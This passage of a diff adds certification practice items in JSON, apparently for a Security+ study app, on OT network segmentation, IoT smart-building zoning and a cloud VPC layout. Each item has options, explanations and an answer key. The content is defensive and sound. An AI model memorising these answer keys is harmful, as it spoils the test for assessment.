+              "id": "hist2",
+              "label": "HIST-2 · read-only copy of historian data for business reporting"
+            },
+            {
+              "id": "plc",
+              "label": "PLC-1 · controls the dosing pumps"
+            },
+            {
+              "id": "erp",
+              "label": "ERP-1 · finance and ERP system"
+            },
+            {
+              "id": "ras",
+              "label": "RAS-1 · host where the vendor's remote sessions land"
+            },
+            {
+              "id": "hmi",
+              "label": "HMI-1 · operator console for the pumps"
+            },
+            {
+              "id": "hist1",
+              "label": "HIST-1 · historian polling every PLC each second"
+            }
+          ],
+          "buckets": [
+            {
+              "id": "it",
+              "label": "Corporate IT (SW-1)"
+            },
+            {
+              "id": "idmz",
+              "label": "Industrial DMZ (SW-2)"
+            },
+            {
+              "id": "ot",
+              "label": "OT control (SW-3)"
+            }
+          ]
+        },
+        "answer": {
+          "map": {
+            "hist2": "idmz",
+            "plc": "ot",
+            "erp": "it",
+            "ras": "idmz",
+            "hmi": "ot",
+            "hist1": "ot"
+          }
+        }
+      },
+      {
+        "id": "s2",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Decide how data and people cross into OT.",
+        "explanation": "Nothing on the corporate side should open a connection into OT. With HIST-1 pushing to HIST-2, data leaves OT on a path FW-2 can restrict to one source, one destination and one port, and finance never touches the control network. Modbus/TCP has no authentication, so letting ERP-1 talk to the PLC directly hands control-network access to anyone who compromises the ERP system. RDP into the HMI does the same with an interactive session. For the vendor, a permanent tunnel or a modem on the PLC both go around FW-2 entirely. Landing on RAS-1 keeps vendor access time-limited, authenticated, recorded and filtered.",
+        "payload": {
+          "slots": [
+            {
+              "id": "figures",
+              "label": "How production figures reach ERP-1",
+              "options": [
+                {
+                  "id": "modbus",
+                  "text": "ERP-1 reads the counters straight from PLC-1 over Modbus/TCP"
+                },
+                {
+                  "id": "rdp",
+                  "text": "An office PC signs in to HMI-1 over RDP each morning and exports a report"
+                },
+                {
+                  "id": "mirror",
+                  "text": "HIST-1 pushes readings out to HIST-2, and ERP-1 reads only from HIST-2"
+                }
+              ]
+            },
+            {
+              "id": "vendor",
+              "label": "How the vendor reaches PLC-1",
+              "options": [
+                {
+                  "id": "perm",
+                  "text": "A permanent site-to-site VPN from the vendor straight into the OT network"
+                },
+                {
+                  "id": "ras",
+                  "text": "VPN to RAS-1 with MFA, switched on per job and recorded"
+                },
+                {
+                  "id": "modem",
+                  "text": "A 4G modem plugged into PLC-1 so the vendor can dial in directly"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "figures": "mirror",
+            "vendor": "ras"
+          }
+        }
+      },
+      {
+        "id": "s3",
+        "type": "configure",
+        "points": 1,
+        "prompt": "PLC-1's firmware is out of support and the vendor will not patch it again. Choose the compensating controls.",
+        "explanation": "When a system cannot be patched, you shrink who can reach it and watch it closely. Limiting PLC-1 to the systems that legitimately talk to it means an attacker has to compromise one of those first. A PLC cannot run an EDR agent, and a nightly reboot interrupts the process it controls while doing nothing about the flaw. Active scanning is the OT-specific trap. Fragile controllers can hang or fault when they are scanned, so in a live plant the safer choice is passive monitoring of a traffic copy.",
+        "payload": {
+          "slots": [
+            {
+              "id": "contain",
+              "label": "Containment",
+              "options": [
+                {
+                  "id": "edr",
+                  "text": "Install an EDR agent on PLC-1 to catch malware in real time"
+                },
+                {
+                  "id": "reboot",
+                  "text": "Reboot PLC-1 nightly to clear anything resident in memory"
+                },
+                {
+                  "id": "acl",
+                  "text": "Let only HMI-1, HIST-1 and approved maintenance reach PLC-1"
+                }
+              ]
+            },
+            {
+              "id": "watch",
+              "label": "Monitoring",
+              "options": [
+                {
+                  "id": "passive",
+                  "text": "Passively monitor a SPAN copy of OT traffic"
+                },
+                {
+                  "id": "scan",
+                  "text": "Run active vulnerability scans against PLC-1 weekly"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "contain": "acl",
+            "watch": "passive"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-dg-07",
+    "cert": "secplus",
+    "objective": "3.1",
+    "topic": "IoT and embedded systems",
+    "title": "Sort out the smart-building network",
+    "estMinutes": 5,
+    "archetype": "diagram",
+    "scenario": "Cobalt Studios has moved into a smart building, and right now everything shares one flat network: staff laptops, the finance file server, eight IP cameras, the HVAC controller, the door badge readers and visitors' phones on the guest Wi-Fi. The building devices run embedded firmware their manufacturers patch rarely, if ever, and two of the cameras still had their factory passwords. The redesign splits the network into three segments behind FW-1.",
+    "assets": {
+      "reference": {
+        "kind": "network",
+        "devices": [
+          {
+            "id": "inet",
+            "label": "INTERNET",
+            "type": "box",
+            "x": 2,
+            "y": 0
+          },
+          {
+            "id": "fw1",
+            "label": "FW-1",
+            "type": "firewall",
+            "x": 2,
+            "y": 1
+          },
+          {
+            "id": "sw1",
+            "label": "SW-1",
+            "type": "switch",
+            "zone": "staff LAN",
+            "ip": "10.80.1.2",
+            "mask": "255.255.255.0",
+            "x": 0,
+            "y": 1
+          },
+          {
+            "id": "sw2",
+            "label": "SW-2",
+            "type": "switch",
+            "zone": "IoT segment",
+            "ip": "10.80.20.2",
+            "mask": "255.255.255.0",
+            "x": 1,
+            "y": 3
+          },
+          {
+            "id": "ap1",
+            "label": "AP-1",
+            "type": "box",
+            "zone": "guest Wi-Fi",
+            "ip": "10.80.99.2",
+            "mask": "255.255.255.0",
+            "x": 4,
+            "y": 1
+          }
+        ],
+        "links": [
+          {
+            "from": "inet",
+            "to": "fw1"
+          },
+          {
+            "from": "fw1",
+            "to": "sw1"
+          },
+          {
+            "from": "fw1",
+            "to": "sw2"
+          },
+          {
+            "from": "fw1",
+            "to": "ap1"
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "s1",
+        "type": "categorize",
+        "points": 1,
+        "prompt": "Drag each device group into the segment where it belongs.",
+        "explanation": "The cameras, the HVAC controller and the badge readers share a profile: embedded firmware that rarely gets patched, weak defaults, and one narrow job. Grouping them on their own segment means a compromised camera cannot reach FIN-1 or a staff laptop. Visitors' devices are unmanaged and untrusted, so they get the guest network and nothing else. The staff laptops and the finance server stay together on the staff LAN, away from both.",
+        "payload": {
+          "items": [
+            {
+              "id": "cam",
+              "label": "CAM-1 to CAM-8 · IP cameras"
+            },
+            {
+              "id": "fin",
+              "label": "FIN-1 · finance file server"
+            },
+            {
+              "id": "vis",
+              "label": "Visitors' phones and laptops"
+            },
+            {
+              "id": "hvac",
+              "label": "HVAC-1 · heating and cooling controller"
+            },
+            {
+              "id": "lap",
+              "label": "Design team laptops"
+            },
+            {
+              "id": "badge",
+              "label": "BADGE-1 · door badge readers"
+            }
+          ],
+          "buckets": [
+            {
+              "id": "staff",
+              "label": "Staff LAN (SW-1)"
+            },
+            {
+              "id": "iot",
+              "label": "IoT segment (SW-2)"
+            },
+            {
+              "id": "guest",
+              "label": "Guest Wi-Fi (AP-1)"
+            }
+          ]
+        },
+        "answer": {
+          "map": {
+            "cam": "iot",
+            "fin": "staff",
+            "vis": "guest",
+            "hvac": "iot",
+            "lap": "staff",
+            "badge": "iot"
+          }
+        }
+      },
+      {
+        "id": "s2",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Set FW-1's policy for the new segments.",
+        "explanation": "Guests get internet access and nothing else. Letting visitors print is not worth a path into the staff LAN. The IoT segment should never open connections to staff systems, because the whole point of separating it is that a compromised camera hits a wall. Outbound, the devices only need their own manufacturers' update services. Allowing everything lets a hijacked camera join a botnet or send footage anywhere, and opening inbound access from the internet is how exposed cameras end up found by internet-wide scanners for anyone to log in to.",
+        "payload": {
+          "slots": [
+            {
+              "id": "guest",
+              "label": "Guest Wi-Fi",
+              "options": [
+                {
+                  "id": "staff",
+                  "text": "Internet plus the staff LAN, so visitors can print"
+                },
+                {
+                  "id": "inet",
+                  "text": "Internet only, no access to the other segments"
+                },
+                {
+                  "id": "all",
+                  "text": "Full access, since visitors are always accompanied"
+                }
+              ]
+            },
+            {
+              "id": "iotStaff",
+              "label": "IoT segment to staff LAN",
+              "options": [
+                {
+                  "id": "deny",
+                  "text": "Deny"
+                },
+                {
+                  "id": "allow",
+                  "text": "Allow, so the devices can reach staff systems when needed"
+                }
+              ]
+            },
+            {
+              "id": "iotNet",
+              "label": "IoT segment and the internet",
+              "options": [
+                {
+                  "id": "any",
+                  "text": "Allow all outbound traffic from the devices"
+                },
+                {
+                  "id": "inbound",
+                  "text": "Allow inbound so installers can manage devices remotely"
+                },
+                {
+                  "id": "vendor",
+                  "text": "Only outbound to each maker's update servers"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "guest": "inet",
+            "iotStaff": "deny",
+            "iotNet": "vendor"
+          }
+        }
+      },
+      {
+        "id": "s3",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Reduce the cameras' attack surface.",
+        "explanation": "Segmentation limits what a compromised device can reach. It does not stop the compromise. Factory passwords are published online, so they have to go even behind a firewall, and a shared password means one leaked camera unlocks all eight, so each gets its own. Every running service is another way in, and Telnet sends credentials in clear text. UPnP lets a device open inbound ports on any gateway that honors it, with nobody approving the change.",
+        "payload": {
+          "slots": [
+            {
+              "id": "creds",
+              "label": "Credentials",
+              "options": [
+                {
+                  "id": "one",
+                  "text": "One strong password shared by all eight cameras"
+                },
+                {
+                  "id": "keep",
+                  "text": "Keep the factory passwords now that the cameras are segmented"
+                },
+                {
+                  "id": "unique",
+                  "text": "A unique strong password per camera, kept in the vault"
+                }
+              ]
+            },
+            {
+              "id": "svc",
+              "label": "Services",
+              "options": [
+                {
+                  "id": "off",
+                  "text": "Disable Telnet, UPnP and every other service the cameras do not need"
+                },
+                {
+                  "id": "upnp",
+                  "text": "Turn on UPnP so the cameras can open the ports they need automatically"
+                },
+                {
+                  "id": "all",
+                  "text": "Leave every service running in case the installer needs it later"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "creds": "unique",
+            "svc": "off"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-dg-08",
+    "cert": "secplus",
+    "objective": "3.1",
+    "topic": "Cloud architecture",
+    "title": "Lay out the claims app VPC",
+    "estMinutes": 5,
+    "archetype": "diagram",
+    "scenario": "Rowan Mutual is moving its claims app into a cloud VPC, 10.0.0.0/16, with two subnets. Subnet 1 (10.0.1.0/24) has a route sending 0.0.0.0/0 to the internet gateway, IGW-1. Subnet 2 (10.0.2.0/24) has no route to IGW-1. Every resource, including the NAT gateway, is deployed into one of the two subnets. Customers reach the app over HTTPS through a load balancer. The app server and the database must not be reachable from the internet, but the app server has to download OS patches from the vendor's repository on the internet. Admins connect over SSH from the office range, 198.51.100.0/24, to a hardened host, then on to the servers.",
+    "assets": {
+      "reference": {
+        "kind": "network",
+        "devices": [
+          {
+            "id": "inet",
+            "label": "INTERNET",
+            "type": "box",
+            "x": 3,
+            "y": 0
+          },
+          {
+            "id": "igw",
+            "label": "IGW-1",
+            "type": "router",
+            "x": 2,
+            "y": 0
+          },
+          {
+            "id": "sub1",
+            "label": "SUBNET 1",
+            "type": "box",
+            "zone": "VPC 10.0.0.0/16",
+            "ip": "10.0.1.0/24",
+            "x": 1,
+            "y": 1
+          },
+          {
+            "id": "sub2",
+            "label": "SUBNET 2",
+            "type": "box",
+            "zone": "VPC 10.0.0.0/16",
+            "ip": "10.0.2.0/24",
+            "x": 2,
+            "y": 1
+          }
+        ],
+        "links": [
+          {
+            "from": "inet",
+            "to": "igw"
+          },
+          {
+            "from": "igw",
+            "to": "sub1"
+          },
+          {
+            "from": "sub1",
+            "to": "sub2"
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "s1",
+        "type": "categorize",
+        "points": 1,
+        "prompt": "Drag each resource into the subnet where it belongs.",
+        "explanation": "Subnet 1 is the public subnet because its route table points at the internet gateway, so it holds only what the internet must reach or what needs that route for itself. LB-1 receives customer traffic and BAST-1 receives admin SSH. NAT-1 has to sit there too, because it forwards private instances' traffic out through IGW-1, and a NAT gateway in Subnet 2 would have no way out either. APP-1 and DB-1 go in the private subnet, where nothing on the internet can address them directly.",
+        "payload": {
+          "items": [
+            {
+              "id": "app",
+              "label": "APP-1 · claims application server"
+            },
+            {
+              "id": "nat",
+              "label": "NAT-1 · NAT gateway"
+            },
+            {
+              "id": "db",
+              "label": "DB-1 · claims database"
+            },
+            {
+              "id": "lb",
+              "label": "LB-1 · load balancer receiving customers' HTTPS"
+            },
+            {
+              "id": "bast",
+              "label": "BAST-1 · hardened SSH host admins sign in to first"
+            }
+          ],
+          "buckets": [
+            {
+              "id": "s1",
+              "label": "Subnet 1 (10.0.1.0/24)"
+            },
+            {
+              "id": "s2",
+              "label": "Subnet 2 (10.0.2.0/24)"
+            }
+          ]
+        },
+        "answer": {
+          "map": {
+            "app": "s2",
+            "nat": "s1",
+            "db": "s2",
+            "lb": "s1",
+            "bast": "s1"
+          }
+        }
+      },
+      {
+        "id": "s2",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Finish the routing and the inbound rules.",
+        "explanation": "Pointing Subnet 2's default route at NAT-1 lets APP-1 reach the patch repository while staying unreachable from outside. Point it at IGW-1 and Subnet 2 becomes a public subnet by definition, and with no default route at all patching fails. BAST-1 should accept SSH only from the office range, since SSH open to the whole internet draws constant brute-force attempts, and an RDP rule does nothing for admins who connect over SSH. DB-1 should accept database connections only from APP-1. Opening it to the whole VPC lets anything in either subnet, including the internet-facing hosts, try the database, and the load balancer never talks to the database at all.",
+        "payload": {
+          "slots": [
+            {
+              "id": "route",
+              "label": "Subnet 2 route table: 0.0.0.0/0 goes to",
+              "options": [
+                {
+                  "id": "igw",
+                  "text": "IGW-1"
+                },
+                {
+                  "id": "none",
+                  "text": "Nowhere; leave no default route"
+                },
+                {
+                  "id": "nat",
+                  "text": "NAT-1"
+                },
+                {
+                  "id": "lb",
+                  "text": "LB-1"
+                }
+              ]
+            },
+            {
+              "id": "bast",
+              "label": "BAST-1 inbound rule",
+              "options": [
+                {
+                  "id": "sshany",
+                  "text": "TCP 22 from 0.0.0.0/0"
+                },
+                {
+                  "id": "sshoffice",
+                  "text": "TCP 22 from 198.51.100.0/24"
+                },
+                {
+                  "id": "rdpoffice",
+                  "text": "TCP 3389 from 198.51.100.0/24"
+                },
+                {
+                  "id": "allany",
+                  "text": "All traffic from 0.0.0.0/0"
+                }
+              ]
+            },
+            {
+              "id": "db",
+              "label": "DB-1 inbound rule for the database port",
+              "options": [
+                {
+                  "id": "vpc",
+                  "text": "TCP 5432 from the whole VPC, 10.0.0.0/16"
+                },
+                {
+                  "id": "app",
+                  "text": "TCP 5432 from APP-1 only"
+                },
+                {
+                  "id": "lb",
+                  "text": "TCP 5432 from LB-1"
+                },
+                {
+                  "id": "any",
+                  "text": "TCP 5432 from 0.0.0.0/0"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "route": "nat",
+            "bast": "sshoffice",
+            "db": "app"
+          }
+        }
+      },
+      {
+        "id": "s3",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "What does NAT-1 do for APP-1?",
+        "explanation": "A NAT gateway translates outbound connections from private instances to its own public address and lets only the replies back in. That is exactly what APP-1 needs for patching without becoming reachable. It never accepts new inbound connections, which is why customers come in through LB-1 instead. It does not encrypt anything, and APP-1 never gets a public address of its own, because it shares NAT-1's.",
+        "payload": {
+          "multi": false,
+          "lines": [
+            {
+              "id": "l1",
+              "text": "Customers can reach APP-1 directly on TCP 443 through NAT-1"
+            },
+            {
+              "id": "l2",
+              "text": "It encrypts all traffic flowing between Subnet 1 and Subnet 2"
+            },
+            {
+              "id": "l3",
+              "text": "APP-1 can connect out, but the internet cannot connect in to it"
+            },
+            {
+              "id": "l4",
+              "text": "APP-1 gets its own permanent public IP address from it"
+            }
+          ]
+        },
+        "answer": {
+          "selected": [
+            "l3"
+          ]
+        }
+      }
     ]
   }
 ];
